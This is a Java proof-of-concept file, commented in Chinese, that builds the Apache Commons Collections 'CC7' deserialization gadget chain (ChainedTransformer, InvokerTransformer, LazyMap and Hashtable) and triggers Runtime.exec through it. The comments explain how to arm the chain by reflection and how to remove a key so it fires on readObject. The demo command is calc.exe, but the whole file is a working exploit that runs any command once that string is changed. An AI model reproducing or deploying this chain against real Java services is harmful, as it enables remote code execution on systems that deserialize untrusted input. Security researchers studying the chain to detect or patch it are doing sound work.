package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class Cc7Poc {

    public static void main(String[] args) throws Exception {

        //命令
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"})
        };

        //空chainedTransformer对象
        Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{});

        //LazyMap实例
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
        lazyMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, "test");
        hashtable.put(lazyMap2, "test");
        /*
         * 为避免在构建利用链时时触发漏洞，选择先构建空利用链,然后再将transformers通过反射
         * 机制加载到空利用链对象hashtable中chainedTransformer的成员属性iTransformers上。
         * */
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        /*
         * hashtable.put会使得lazyMap2增加一个yy->yy,需要移除否则不会触发漏洞
         * */
        lazyMap2.remove("yy");

        // 序列化利用链
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashtable);
        oos.flush();
        oos.close();

        // 反序列化测试
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}